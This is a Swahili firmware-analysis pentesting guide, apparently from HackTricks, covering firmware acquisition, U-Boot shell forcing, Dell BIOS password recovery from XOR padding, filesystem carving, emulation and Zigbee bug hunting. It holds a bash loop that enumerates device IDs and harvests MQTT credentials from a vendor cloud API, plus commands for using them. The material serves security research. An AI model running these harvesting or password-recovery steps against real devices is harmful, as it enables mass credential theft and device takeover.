# Uchambuzi wa Firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Utangulizi**

### Rasilimali zinazohusiana

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ni software muhimu inayowezesha vifaa kufanya kazi ipasavyo kwa kudhibiti na kurahisisha mawasiliano kati ya vipengele vya hardware na software ambayo watumiaji hutumia. Huhifadhiwa kwenye kumbukumbu isiyofutika, hivyo kuhakikisha kifaa kinaweza kufikia maelekezo muhimu mara tu kinapowashwa, na hivyo kuanzisha mfumo wa uendeshaji. Kuchunguza na huenda kurekebisha firmware ni hatua muhimu katika kutambua udhaifu wa usalama.<sup>[[2]](#references)[[3]](#references)</sup>

## **Kukusanya Taarifa**

**Kukusanya taarifa** ni hatua muhimu ya awali ya kuelewa muundo wa kifaa na teknolojia kinazotumia. Mchakato huu unahusisha kukusanya data kuhusu:

- Usanifu wa CPU na mfumo wa uendeshaji unaoendesha
- Maelezo ya bootloader
- Muundo wa hardware na datasheet
- Vipimo vya codebase na maeneo ya source code
- Maktaba za nje na aina za leseni
- Historia ya masasisho na vyeti vya udhibiti
- Michoro ya usanifu na mtiririko
- Tathmini za usalama na udhaifu uliotambuliwa

Kwa madhumuni haya, zana za **open-source intelligence (OSINT)** ni muhimu sana, pamoja na uchanganuzi wa vipengele vyovyote vya open-source software vinavyopatikana, kwa kutumia michakato ya ukaguzi wa mikono na kiotomatiki. Zana kama [Coverity Scan](https://scan.coverity.com) na [Semmle’s LGTM](https://lgtm.com/#explore) hutoa static analysis bila malipo inayoweza kutumika kutafuta matatizo yanayoweza kutokea.

## **Kupata Firmware**

Firmware inaweza kupatikana kwa njia mbalimbali, kila moja ikiwa na kiwango chake cha ugumu:

- Kuipata **moja kwa moja** kutoka kwa chanzo (watengenezaji, wazalishaji)
- **Kuijenga** kwa kutumia maelekezo yaliyotolewa
- **Kuipakua** kutoka kwenye tovuti rasmi za usaidizi
- Kutumia hoja za **Google dork** kutafuta faili za firmware zilizohifadhiwa mtandaoni
- Kufikia **hifadhi ya cloud** moja kwa moja, kwa kutumia zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Kuingilia **masasisho** kwa kutumia mbinu za man-in-the-middle
- **Kuitoa** kwenye kifaa kupitia miunganisho kama **UART**, **JTAG**, au **PICit**
- **Kunasa** maombi ya masasisho ndani ya mawasiliano ya kifaa
- Kutambua na kutumia **vituo vya masasisho vilivyowekwa moja kwa moja kwenye code**
- **Kuitoa** kutoka kwenye bootloader au mtandao
- **Kuondoa na kusoma** chipu ya hifadhi, iwapo njia nyingine zote hazitafaulu, kwa kutumia zana zinazofaa za hardware

### Logi za UART pekee: lazimisha root shell kupitia mazingira ya U-Boot kwenye flash

Ikiwa UART RX imepuuzwa (logi pekee), bado unaweza kulazimisha init shell kwa **kuhariri blob ya mazingira ya U-Boot** ukiwa nje ya kifaa:<sup>[[6]](#references)</sup>

1. Tumia klipu ya SOIC-8 na programmer (3.3V) kutoa dump ya SPI flash:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Tafuta partition ya U-Boot env, hariri `bootargs` ili ijumuishwe `init=/bin/sh`, na **ukokotoe upya U-Boot env CRC32** ya blob.
3. Flash upya partition ya env pekee kisha uwashe upya; shell inapaswa kuonekana kwenye UART.

Hii ni muhimu kwenye vifaa vilivyopachikwa ambapo shell ya bootloader imezimwa lakini partition ya env inaweza kuandikika kupitia ufikiaji wa flash wa nje.

## Kuchanganua firmware

Kwa kuwa sasa **una firmware**, unahitaji kutoa taarifa kutoka kwayo ili kujua jinsi ya kuishughulikia. Zana tofauti unazoweza kutumia kwa hilo:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Ikiwa hupati mengi kwa kutumia zana hizo, angalia **entropy** ya image kwa `binwalk -E <bin>`. Ikiwa entropy ni ndogo, huenda haijasimbwa kwa usimbaji fiche. Ikiwa entropy ni kubwa, huenda imesimbwa (au imebanwa kwa namna fulani).

Zaidi ya hayo, unaweza kutumia zana hizi kutoa **faili zilizopachikwa ndani ya firmware**:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Au [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kukagua faili.

### Uchambuzi linganishi wa flash na hifadhi za siri za XOR zinazoweza kurejeshwa

Ikiwa mpangilio wa firmware hauna umbizo la hifadhi lililoandikwa kwenye nyaraka, kwanza fanya usomaji kadhaa unaolingana wa flash, badilisha mpangilio **mmoja tu**, dump chip nzima tena, kisha linganisha offsets. Kurudia jaribio kwa thamani zinazodhibitiwa hutofautisha mpangilio huo na vihesabio pamoja na metadata ya uandishi; mabadiliko yanayotokea kwenye offsets mpya badala ya sehemu zilezile huashiria hifadhi ya append-only au iliyopangwa kama log. Hifadhi ingizo zilizofutwa/kuwekewa alama ya kufutwa, kwa sababu data zake zinaweza bado kurejeshwa.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Baada ya kupata eneo hilo, toa firmware modules kwa kutumia zana kama `binwalk` na ufanye reverse engineering ya writer/validator katika Ghidra. Thibitisha mipaka ya field, padding, key indexing na key derivation kwenye code badala ya kukisia mpangilio kwa kutegemea mifumo ya ciphertext pekee.<sup>[[10]](#references)</sup>

#### Rejesha keys kutoka kwenye zero padding iliyosimbwa kwa njia fiche

Kama ilivyoelezwa katika [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), known plaintext hufichua byte za keystream katika offsets zilezile. Field ya ukubwa usiobadilika huwa hatarini hasa pale zero padding yake inapojumuisha kila index ya key ya XOR inayojirudia: padding iliyosimbwa hufichua byte hizo za key moja kwa moja, kwa sababu `0x00 XOR key_byte = key_byte`. Ikiwa kila index ya key imejumuishwa, jenga upya key kutoka kwenye mwisho wa ciphertext na usimbue byte zilizo na data.<sup>[[10]](#references)</sup>

Muundo wa DVAR BIOS-password wa Dell ulio hatarini ni mfano halisi: byte `0` ya field ya byte 32 iko wazi, huku byte `1..31` zikitumia key ya byte 20 inayojirudia.<sup>[[10]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Kwa urefu wa password `L`, nafasi `L..31` zilikuwa sifuri kabla ya XOR. Wakati `L <= 12`, nafasi hizo zinajumuisha kila faharasa ya key, kwa hiyo key na password kamili hupatikana bila brute force:<sup>[[10]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Pata funguo kutoka kwenye rekodi za kihistoria

Usichanganue kila rekodi kivyake. Ufunguo wa DVAR hukokotolewa takribani kama `modified_md5(device_seed || variable_GUID || password[0])`: seed ya kifaa na GUID hazibadiliki, na ingizo pekee linalotegemea password ni byte ya kwanza iliyo wazi. Hii huweka idadi ya funguo zisizozidi 256 kwa kila kifaa, na rekodi zinazoanza kwa byte moja hushiriki ufunguo. Panga rekodi zilizo hai na zilizofutwa kulingana na byte hiyo; rekodi fupi ya kihistoria inaweza kuvuja ufunguo kamili kupitia padding na kufungua rekodi ndefu ya sasa ambayo padding yake haitoshi. Kwa hiyo, kubadilisha password kunaweza kuongeza hatari ya kufichuliwa wakati ciphertext ya zamani inawekwa alama kuwa imefutwa badala ya kufutwa kabisa.<sup>[[10]](#references)</sup>

Zana ya [`dellpwn`](https://github.com/R3n5k1/dellpwn) hutafuta DVAR, kuthibitisha rekodi zinazoweza kuwa sahihi, kurejesha password, na kuonyesha byte ghafi zilizohifadhiwa/za ufunguo. Iunde kutoka kwenye checkout na uchanganue picha ya flash iliyothibitishwa kama ifuatavyo:<sup>[[11]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Kwa custom parsers, kataa matokeo chanya yasiyo sahihi kwa kutumia muundo wa rekodi, masharti ya herufi zinazochapishika, ukaguzi wa zero-padding, entropy ya key, na uthabiti mahali ambapo key inajirudia. Ikiwa dumps zinazorudiwa zinaonyesha mabadiliko machache ya bit kwa kila write, orodhesha masks zilizoonekana na panga marekebisho kwa kutumia masharti haya, lakini ripoti herufi zisizo na uhakika badala ya kuwasilisha matokeo ya heuristic kana kwamba ni urejeshaji sahihi.<sup>[[10]](#references)</sup>

Password verifiers zinapaswa kuhifadhi salted, iterated one-way hash badala ya reversible ciphertext, na log-structured stores zinapaswa kuondoa kwa usalama nyenzo za siri zilizopitwa na wakati.<sup>[[10]](#references)</sup>

### Kupata Mfumo wa Faili

Ukitumia zana za awali zilizo na maelezo, kama `binwalk -ev <bin>`, unapaswa kuwa umeweza **kutoa mfumo wa faili**.\
Kwa kawaida, Binwalk huitoa ndani ya **folda yenye jina la aina ya mfumo wa faili**, ambayo kwa kawaida huwa mojawapo ya hizi: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Kutoa Mfumo wa Faili kwa Mkono

Wakati mwingine, binwalk haitakuwa na magic byte ya mfumo wa faili kwenye sahihi zake. Katika hali hizi, tumia binwalk **kupata offset ya mfumo wa faili na carve mfumo wa faili uliobanwa** kutoka kwenye binary, kisha **toa mfumo wa faili kwa mkono** kulingana na aina yake kwa kutumia hatua zilizo hapa chini.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Tekeleza **dd command** ifuatayo ili kufanya carving ya mfumo wa faili wa Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Vinginevyo, amri ifuatayo pia inaweza kutekelezwa.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Kwa squashfs (iliyotumika kwenye mfano hapo juu)

`$ unsquashfs dir.squashfs`

Faili zitakuwa kwenye saraka ya "`squashfs-root`" baada ya hapo.

- Faili za archive za CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Kwa mifumo ya faili ya jffs2

`$ jefferson rootfsfile.jffs2`

- Kwa mifumo ya faili ya ubifs yenye NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Kuchambua Firmware

Baada ya kupata firmware, ni muhimu kuichunguza kwa undani ili kuelewa muundo wake na udhaifu unaoweza kuwepo. Mchakato huu unahusisha kutumia zana mbalimbali kuchambua na kutoa data muhimu kutoka kwenye picha ya firmware.

### Zana za Uchambuzi wa Awali

Seti ya amri imetolewa kwa ukaguzi wa awali wa faili ya binary (inayorejelewa kama `<bin>`). Amri hizi husaidia kutambua aina za faili, kutoa strings, kuchambua data ya binary, na kuelewa maelezo ya partitions na mfumo wa faili:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Ili kutathmini hali ya usimbaji fiche ya image, **entropy** hukaguliwa kwa kutumia `binwalk -E <bin>`. Entropy ya chini huashiria ukosefu wa usimbaji fiche, ilhali entropy ya juu huashiria uwezekano wa usimbaji fiche au ukandamizaji.

Kwa kutoa **embedded files**, inapendekezwa kutumia zana na nyenzo kama nyaraka za **file-data-carving-recovery-tools** na **binvis.io** kwa ukaguzi wa faili.

### Kutoa Filesystem

Kwa kutumia `binwalk -ev <bin>`, kwa kawaida unaweza kutoa filesystem, mara nyingi kwenye saraka iliyopewa jina la aina ya filesystem (k.m., squashfs, ubifs). Hata hivyo, **binwalk** inaposhindwa kutambua aina ya filesystem kwa sababu ya kukosekana kwa magic bytes, ni lazima kuitoa mwenyewe. Hii huhusisha kutumia `binwalk` kutafuta offset ya filesystem, kisha kutumia amri ya `dd` kuichonga filesystem:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Baadaye, kulingana na aina ya filesystem (k.m., squashfs, cpio, jffs2, ubifs), hutumika commands tofauti ili kutoa maudhui kwa mikono.

### Uchambuzi wa Filesystem

Baada ya kutoa filesystem, utafutaji wa dosari za usalama huanza. Huchunguzwa daemon za mtandao zisizo salama, credentials zilizowekwa moja kwa moja kwenye code, API endpoints, utendakazi wa seva za masasisho, code ambayo haijacompile, startup scripts, na binaries zilizocompile kwa ajili ya uchambuzi wa offline.

**Maeneo muhimu** na **vipengee** vya kukagua ni pamoja na:

- **etc/shadow** na **etc/passwd** kwa ajili ya credentials za watumiaji
- Vyeti na keys za SSL kwenye **etc/ssl**
- Faili za usanidi na script kwa ajili ya udhaifu unaoweza kuwepo
- Binaries zilizopachikwa kwa ajili ya uchambuzi zaidi
- Web servers na binaries za kawaida za vifaa vya IoT

Zana kadhaa husaidia kufichua taarifa nyeti na udhaifu ndani ya filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) na [**Firmwalker**](https://github.com/craigz28/firmwalker) kwa ajili ya kutafuta taarifa nyeti
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kwa ajili ya uchambuzi wa kina wa firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), na [**EMBA**](https://github.com/e-m-b-a/emba) kwa ajili ya uchambuzi wa static na dynamic

### Ukaguzi wa Usalama wa Binaries Zilizocompile

Source code na binaries zilizocompile zinazopatikana kwenye filesystem lazima zikaguliwe kwa makini ili kutafuta udhaifu. Zana kama **checksec.sh** kwa binaries za Unix na **PESecurity** kwa binaries za Windows husaidia kutambua binaries zisizo na ulinzi ambazo zinaweza kutumiwa vibaya.

## Kukusanya usanidi wa cloud na credentials za MQTT kupitia tokeni za URL zilizotokana na taarifa nyingine

Hub nyingi za IoT hupakua usanidi wa kila kifaa kutoka kwenye endpoint ya cloud inayofanana na hii:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Wakati wa uchambuzi wa firmware, unaweza kugundua kuwa `<token>` hutokana na kifaa chenyewe kwa kutumia device ID na secret iliyowekwa moja kwa moja kwenye code, kwa mfano:

- token = MD5( deviceId || STATIC_KEY ) na kuwakilishwa kama herufi kubwa za hex

Muundo huu humwezesha yeyote anayejua deviceId na STATIC_KEY kuunda upya URL na kupata usanidi wa cloud, ambao mara nyingi hufichua credentials za MQTT zilizo wazi na viambishi awali vya topic.

Hatua za utekelezaji:

1) Toa deviceId kutoka kwenye kumbukumbu za kuwasha kupitia UART

- Unganisha adapta ya UART ya 3.3V (TX/RX/GND) na unasa kumbukumbu:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Tafuta mistari inayochapisha muundo wa URL ya cloud config na anwani ya broker, kwa mfano:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Pata tena STATIC_KEY na algorithm ya token kutoka kwenye firmware

- Pakia binaries kwenye Ghidra/radare2 na utafute config path ("/pf/") au matumizi ya MD5.
- Thibitisha algorithm (kwa mfano, MD5(deviceId||STATIC_KEY)).
- Kokotoa token kwenye Bash na uweke digest kwa herufi kubwa:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Kusanya cloud config na credentials za MQTT

- Unda URL na upakue JSON kwa curl; ichanganue kwa jq ili kutoa secrets:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Tumia vibaya plaintext MQTT na topic ACLs dhaifu (ikiwa zipo)

- Tumia credentials zilizorejeshwa ku-subscribe kwenye maintenance topics na kutafuta matukio nyeti:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Orodhesha ID za vifaa zinazotabirika (kwa kiwango kikubwa, ukiwa na idhini)

- Mifumo mingi hujumuisha baiti za OUI ya mtengenezaji/bidhaa/aina zikifuatiwa na kiambishi tamati cha mfuatano.
- Unaweza kujaribu ID zinazowezekana, kupata tokens na kuchukua configs kwa njia ya programu:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Maelezo
- Pata idhini ya wazi kila wakati kabla ya kujaribu kufanya mass enumeration.
- Inapowezekana, pendelea emulation au static analysis ili kurejesha siri bila kurekebisha hardware inayolengwa.

Mchakato wa kufanya emulation ya firmware huruhusu **dynamic analysis** ya utendaji wa kifaa au programu mahususi. Mbinu hii inaweza kukumbana na changamoto zinazohusiana na hardware au utegemezi wa architecture, lakini kuhamisha root filesystem au binaries mahususi kwenye kifaa chenye architecture na endianness inayolingana, kama Raspberry Pi, au kwenye virtual machine iliyoundwa awali, kunaweza kuwezesha majaribio zaidi.

### Kufanya Emulation ya Binaries Binafsi

Unapochunguza programu moja, ni muhimu kutambua endianness na CPU architecture ya programu hiyo.

#### Mfano wa MIPS Architecture

Ili kufanya emulation ya binary ya MIPS architecture, unaweza kutumia amri:

```bash
file ./squashfs-root/bin/busybox
```

Na ili kusakinisha zana zinazohitajika za uigaji:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Kwa MIPS (big-endian), hutumika `qemu-mips`, na kwa binaries za little-endian, `qemu-mipsel` ndiyo chaguo.

#### Uigaji wa ARM Architecture

Kwa binaries za ARM, mchakato ni sawa, huku emulator ya `qemu-arm` ikitumika kwa uigaji.

### Uigaji Kamili wa Mfumo

Zana kama [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), na nyinginezo, huwezesha uigaji kamili wa firmware, huendesha mchakato kiotomatiki na kusaidia katika uchanganuzi wa nguvu.

### Kujenga upya root filesystems zilizogawanywa na kuthibitishwa kwa ajili ya uigaji

Ikiwa superblock ya SquashFS inaweza kusomeka lakini offsets za inode, directory au fragment-table haziwezekani, usiirekebishe `unsquashfs` mara moja. Reverse-engineer binary ya early boot na uunde upya grafu ya block-device inayotengeneza: mifumo iliyopachikwa inaweza kuonyesha partition ya root ya kawaida lakini kujenga filesystem halisi kwa kutumia mapping ya `dm-linear` inayoongeza sectors zilizokopwa kutoka partition nyingine. Ukaguzi wa superblock pekee unaweza kufaulu hata kama kila metadata block inayofuata imehamishwa.<sup>[[9]](#references)</sup>

Hifadhi hesabu za firmware jinsi zilivyo. Hasa, tambua kama urefu ni bytes, sectors za baiti 512 au kurasa za KiB 4; tekeleza shifts na truncation kwa mpangilio wake wa awali; na zingatia maeneo ya mwisho yanayotegemea bank katika mipangilio ya A/B. Kwa mfano, `(partition_bytes >> 12) << 3` kwanza hukata thamani hadi mpaka wa KiB 4, kisha huonyesha matokeo kama sectors za baiti 512; kuibadilisha na `partition_bytes // 512` kunaweza kusogeza extent iliyoongezwa kwa kilobytes chache na kuharibu majedwali yote ya SquashFS yanayofuata.<sup>[[9]](#references)</sup>

Mtiririko mzuri wa uthibitishaji ni:<sup>[[9]](#references)</sup>

1. Pata kifaa chanzo, start sector na urefu wa kila segment ya `dm-linear` kutoka kwa binary ya verifier/init.
2. Unganisha au panga extents bila kubadilisha kanuni zake za alignment.
3. Ikiwa uchimbaji bado unashindwa, tafuta ndani ya eneo dogo tu karibu na mpaka uliokadiriwa na uhakikishe kuna miundo kadhaa halali ya metadata mfululizo, badala ya kukubali superblock inayoonekana kuwa sahihi pekee.
4. Endesha `unsquashfs` isiyobadilishwa dhidi ya image iliyojengwa upya; kufanikiwa kupitia directories na fragments zote ni ushahidi thabiti zaidi kuliko `unsquashfs -stat`.

#### Ubadilishaji wa dm-verity unaodhibitiwa na mchambuzi

Mchambuzi anapodhibiti QEMU kernel, initramfs na diski pepe, root iliyorekebishwa inaweza kuwashwa kwa kubadilisha PID 1 ya uthibitishaji ya mtengenezaji na init ndogo iliyounganishwa statically. Huu ni **lab boot-chain substitution**, si kuvunja dm-verity, sahihi yake ya RSA, Secure Boot au ufunguo uliofungwa na TPM.<sup>[[9]](#references)</sup>

Init mbadala inapaswa kuiga sehemu za kiutendaji za njia asili ya boot: mount `devtmpfs`, ita `setsid()`, unganisha `/dev/console` na file descriptors 0–2, mount `/proc` na `/sys`, subiri kifaa cha block kilichotolewa, mount root iliyohaririwa iwe read-only, detach pseudo-filesystems za old-root, hamisha mount mpya hadi `/` kwa `MS_MOVE`, tekeleza `chroot`, kisha `execve()` `/sbin/init` ya awali ya firmware. Ku-detach `/dev`, `/proc` na `/sys` **kabla** ya `MS_MOVE` huepusha ku-detach mount points ambazo ni sehemu ya root mpya.<sup>[[9]](#references)</sup>

Weka hali inayoweza kubadilika ya kifaa tofauti na root isiyobadilika iliyorekebishwa. Overlay ya qcow2 inaweza kuhifadhi hali ya LVM ya diski asili huku diski ya pili ya virtio ya read-only ikitoa SquashFS iliyohaririwa:<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Utatuzi wa hitilafu wa hali ya image nje ya mtandao

Kagua hali endelevu nje ya guest wakati kuwaka polepole, startup scripts zinazoharibu data, au kumbukumbu zisizoaminika za console zinaficha hitilafu. Usiambatishe overlay inayotumiwa na VM inayoendesha; iweke wazi kwa kutumia `qemu-nbd`, zuia ugunduzi wa LVM kwenye partition ya NBD iliyokusudiwa, na uzime volume group kabla ya kuikata.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Kwa utenganishaji wa hitilafu unaoweza kurudiwa, andika faili za alama zenye mihuri ya muda kwenye hifadhi thabiti inayoweza kuandikiwa na uzihakiki ukiwa nje ya kifaa; `/dev/kmsg`, FIFO na koni za muda mfupi zinaweza kusababisha matokeo hasi ya uongo kutokana na udhibiti wa kasi au mchakato kufa mapema. Pia linganisha violesura halisi katika tabaka zote kabla ya kubadilisha msimbo usiohusika: `uname -r` dhidi ya `/lib/modules/`, vipengele vya ext4 vilivyo kwenye diski dhidi ya usanidi wa kernel, na kizazi cha Mesa `libGL` dhidi ya ABI ya kiendeshi cha DRI na majina ya viendeshi yanayotokana na PCI. Kipengele kinaweza kuwepo na hata `dlopen()` kufanikiwa, lakini kikabaki kisichoweza kutumika kwa sababu mtumiaji wake anatarajia ABI tofauti.<sup>[[9]](#references)</sup>

## Uchambuzi wa Kihamikika kwa Vitendo

Katika hatua hii, mazingira ya kifaa halisi au yaliyoigwa hutumika kwa uchambuzi. Ni muhimu kudumisha ufikiaji wa shell kwa OS na mfumo wa faili. Uigaji huenda usiige kikamilifu mwingiliano wa maunzi, hivyo huenda ukahitaji kuanzisha upya uigaji mara kwa mara. Uchambuzi unapaswa kuchunguza tena mfumo wa faili, kutumia exploit dhidi ya kurasa za wavuti na huduma za mtandao zilizo wazi, na kuchunguza udhaifu wa bootloader. Majaribio ya uadilifu wa firmware ni muhimu ili kubaini udhaifu unaoweza kusababishwa na backdoor.

## Mbinu za Uchambuzi wa Wakati wa Uendeshaji

Uchambuzi wa wakati wa uendeshaji huhusisha kuingiliana na mchakato au binary katika mazingira yake ya uendeshaji, kwa kutumia zana kama gdb-multiarch, Frida na Ghidra kuweka breakpoints na kutambua udhaifu kupitia fuzzing na mbinu nyingine.

Kwa vifaa lengwa vilivyopachikwa ambavyo havina debugger kamili, **nakili `gdbserver` iliyounganishwa tuli** kwenye kifaa na uunganishe nayo ukiwa mbali:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Uchoraji ramani wa ujumbe wa Zigbee / radio-co-processor

Kwenye hub za IoT, RF stack mara nyingi hugawanywa kati ya **radio MCU** na mchakato wa Linux userland. Mbinu muhimu ni kufuatilia njia:<sup>[[8]](#references)</sup>

1. **RF frame** inayosafirishwa hewani
2. **controller-side parser** kwenye radio MCU
3. **serial/UART text au TLV protocol** inayotumwa kwa Linux (kwa mfano `/dev/tty*`)
4. **application dispatcher** kwenye daemon kuu
5. **protocol-specific handler / state machine**

Muundo huu unaunda malengo mawili ya reversing badala ya moja. Ikiwa controller hubadilisha binary radio frames kuwa protocol ya maandishi kama `Group,Command,arg1,arg2,...`, tambua:

- **message groups** na dispatch tables
- Ni ujumbe upi unaweza kutoka kwenye **network** dhidi ya controller yenyewe
- Sehemu halisi za **manufacturer-specific discriminator** (kwa mfano Zigbee `manufacturer_code` na custom `cluster_command`)
- Ni handlers zipi zinazoweza kufikiwa tu wakati wa **commissioning**, ugunduzi, au hatua za kupakua firmware/model

Kwa Zigbee hasa, nasa pairing traffic na ukague ikiwa kifaa lengwa bado kinatumia **Link Key** ya chaguo-msingi `ZigBeeAlliance09`. Ikiwa ndivyo, kunusa commissioning traffic kunaweza kufichua **Network Key**. Zigbee 3.0 install codes hupunguza hatari hii, kwa hiyo angalia ikiwa kifaa kilichojaribiwa kinazitekeleza kweli.

### Manufacturer-specific protocol handlers na ufikikaji unaodhibitiwa na FSM

Amri za Zigbee/ZCL za vendor-specific mara nyingi huwa malengo bora kuliko standardized clusters kwa sababu hupitishwa kwenye **custom parsing code** na **FSMs** za ndani zenye validation ambayo haijajaribiwa kwa kina.<sup>[[8]](#references)</sup>

Mbinu ya vitendo:

- Fanya reverse ya command dispatcher hadi upate **vendor-only handler**.
- Tambua jedwali za **FSM state**, **event**, **check**, **action**, na **next-state**.
- Tambua **transitional states** zinazoendelea zenyewe, pamoja na matawi ya retry/error ambayo hatimaye huweka upya au kuachilia state inayodhibitiwa na mshambuliaji.
- Thibitisha ni mabadilishano yapi halali ya protocol yanayohitajika ili kuweka daemon katika hali iliyo hatarini, badala ya kudhani kuwa handler yenye hitilafu inaweza kufikiwa kila wakati.

Kwa protocol zinazotegemea muda kwa usahihi, packet replay kutoka Python framework inaweza kuwa polepole mno. Mbinu inayotegemewa zaidi ni kuiga kifaa halali kwenye hardware halisi (kwa mfano **nRF52840**) kwa kutumia stack ya kiwango cha vendor ili uweze kuwasilisha **endpoints**, **attributes**, na muda sahihi wa commissioning.

### Aina ya hitilafu ya upakuaji uliogawanywa katika embedded daemons

Aina ya hitilafu ya firmware inayojirudia huonekana kwenye upakuaji wa **blob/model/configuration uliogawanywa**:<sup>[[8]](#references)</sup>

1. **Fragment ya kwanza** (`offset == 0`) huhifadhi `ctx->total_size` na kutenga `malloc(total_size)`.
2. Fragment zinazofuata hukagua tu sehemu za **packet-local** zinazodhibitiwa na mshambuliaji, kama vile `packet_total_size >= offset + chunk_len`.
3. Nakala hutumia `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bila kuangalia kama iko ndani ya **ukubwa wa awali uliotengwa**.

Hii humwezesha mshambuliaji kutuma:

- Fragment ya kwanza halali yenye ukubwa wa jumla uliotangazwa **mdogo** ili kulazimisha utengaji mdogo wa heap.
- Fragment inayofuata yenye **offset inayotarajiwa** lakini `chunk_len` kubwa zaidi.
